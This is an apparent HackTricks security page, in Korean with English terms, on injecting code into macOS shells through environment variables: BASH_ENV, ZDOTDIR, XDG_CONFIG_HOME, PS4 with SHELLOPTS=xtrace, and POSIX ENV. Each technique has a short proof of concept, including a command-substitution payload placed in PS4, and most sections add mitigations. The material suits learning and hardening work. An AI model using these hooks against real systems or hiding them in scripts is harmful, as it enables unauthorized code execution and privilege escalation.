# macOS Shell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `BASH_ENV`

Bash가 script 또는 `-c` command를 실행하기 위해 non-interactively 시작되면 `BASH_ENV` 값을 확장하고, 요청된 command를 실행하기 전에 그 결과로 지정된 file을 source합니다. Bash는 이 file을 찾을 때 `PATH`를 사용하지 않습니다. 따라서 attacker가 제어하는 environment variables를 사용해 non-interactive Bash를 실행하는 process는 먼저 읽을 수 있는 shell payload를 실행하도록 만들 수 있습니다.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/bash-startup-hook.sh <<'EOF'
#!/bin/bash
/usr/bin/touch /tmp/bash-env-executed
EOF

BASH_ENV=/tmp/bash-startup-hook.sh /bin/bash -c '/usr/bin/true'
test -e /tmp/bash-env-executed && echo 'BASH_ENV executed'
```
The hook은 대상이 실제로 Bash를 시작할 때만 실행됩니다. 다른 platform의 `/bin/sh` 또는 shell 없이 command를 실행하는 program은 이를 반드시 따르지 않습니다. privileged mode의 Bash는 `BASH_ENV`를 무시합니다. effective 및 real user/group ID가 서로 다르면 Bash는 startup file도 건너뛰고 `-p`가 제공되지 않는 한 effective ID를 재설정합니다. `-p`를 사용하면 privileged mode가 계속 활성화되고 `BASH_ENV`는 여전히 무시됩니다.<sup>[[1]](#references)[[2]](#references)</sup>

macOS에서 `launchd` job은 inherited 또는 per-job environment variable을 정의할 수 있으므로, privileged script에 environment를 전달하는 plist와 launch context를 검사해야 합니다. interpreter variable을 정리하는 데 SIP만 의존하지 마십시오. 최소 environment(`env -i`)를 사용하고, `BASH_ENV`를 명시적으로 unset하며, 의도한 interpreter를 absolute path로 호출하고, writable startup file을 피하십시오.

## zsh `ZDOTDIR`

zsh는 non-interactive shell을 포함한 모든 일반 shell에서 `$ZDOTDIR/.zshenv`를 읽습니다. `ZDOTDIR`이 unset이면 `HOME`을 사용합니다. 따라서 `ZDOTDIR`을 writable directory로 redirect하면 `zsh -c` command 또는 script 전에 해당 `.zshenv`가 실행됩니다.<sup>[[3]](#references)</sup>
```bash
mkdir -p /tmp/zsh-startup
echo '/usr/bin/touch /tmp/zshenv-executed' > /tmp/zsh-startup/.zshenv
ZDOTDIR=/tmp/zsh-startup /bin/zsh -c /usr/bin/true
```
`zsh -f`는 `RCS` option을 해제하고 이 user startup file을 건너뜁니다. global `/etc/zshenv`는 여전히 읽히므로, 신뢰할 수 있고 최소한으로 유지해야 합니다.

## fish `XDG_CONFIG_HOME`

fish는 interactive 또는 login shell뿐만 아니라 모든 shell의 startup 시 `$XDG_CONFIG_HOME/fish/conf.d/*.fish`와 `$XDG_CONFIG_HOME/fish/config.fish`를 읽습니다. 또한 `XDG_DATA_DIRS`의 항목 아래에 있는 `fish/vendor_conf.d/*.fish`도 실행합니다. 따라서 공격자가 이러한 변수 중 하나와 읽을 수 있는 directory를 제어하면 fish script 또는 `-c` command보다 먼저 code를 실행할 수 있습니다.<sup>[[4]](#references)</sup>
```bash
mkdir -p /tmp/fish-startup/fish
echo 'touch /tmp/fish-config-executed' > /tmp/fish-startup/fish/config.fish
XDG_CONFIG_HOME=/tmp/fish-startup fish -c true

# Vendor configuration variant
mkdir -p /tmp/fish-vendor/fish/vendor_conf.d
echo 'touch /tmp/fish-vendor-executed' > /tmp/fish-vendor/fish/vendor_conf.d/10-hook.fish
XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
```
`fish --no-config`를 사용하여 신뢰할 수 있는 invocation을 수행하고 신뢰할 수 없는 XDG 경로 변수를 삭제하세요.

## bash `PS4` + xtrace (`SHELLOPTS`)

Bash가 **xtrace** 옵션으로 실행되면, 추적되는 각 명령 전에 `PS4`를 확장한 후 출력합니다. `PS4`는 일반 prompt와 같은 방식으로 확장되므로, 그 안의 **command substitution**이 실행됩니다. `PS4`의 값과 xtrace를 활성화하는 방식 모두 전적으로 environment에서 가져올 수 있습니다. `SHELLOPTS=xtrace`를 export하면 일반적인 `bash script.sh` 실행에서도 xtrace가 활성화됩니다(`-x` flag 불필요). 이로 인해 victim이 실행하는 모든 Bash script가 code execution으로 이어질 수 있습니다.<sup>[[5]](#references)</sup>
```bash
echo 'x=1; echo done' > /tmp/victim.sh

# Pure environment-variable injection (no -x on the command line)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a maintenance/CI job is run with debugging on
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4`는 xtrace가 활성화될 때까지는 아무 동작도 하지 않습니다 (`SHELLOPTS=xtrace`, `set -x` 또는 `bash -x`를 통해 활성화). Bash는 **privileged mode**에서 `SHELLOPTS`를 무시합니다 (`-p` 처리 없이 real/effective ID가 다른 경우). 따라서 `BASH_ENV`와 동일한 setuid 주의사항이 적용됩니다.

## POSIX `ENV`

POSIX 스타일 shell(`/bin/sh`, `dash`, `ksh`)은 시작 시 **interactive** shell인 경우 `ENV` 변수를 읽고, 이를 expand한 다음 그 결과 파일을 source합니다. 이는 `BASH_ENV`의 POSIX 대응 요소입니다 (`BASH_ENV`는 *non-interactive* Bash에서 동작함). 따라서 `ENV`를 제어하면 victim이 interactive `sh`/`dash`를 실행할 때마다 code가 실행됩니다.
```bash
echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
echo 'exit' | ENV=/tmp/env-hook.sh dash -i
test -e /tmp/env-executed && echo 'ENV executed'
```
## References

- [1] [Bash 시작 파일](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
- [2] [Bash 호출](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [3] [zsh 시작/종료 파일](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
- [4] [fish 구성 파일](https://fishshell.com/docs/current/language.html#configuration-files)
- [5] [Bash 변수 - `PS4` 및 Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
{{#include ../../../banners/hacktricks-training.md}}
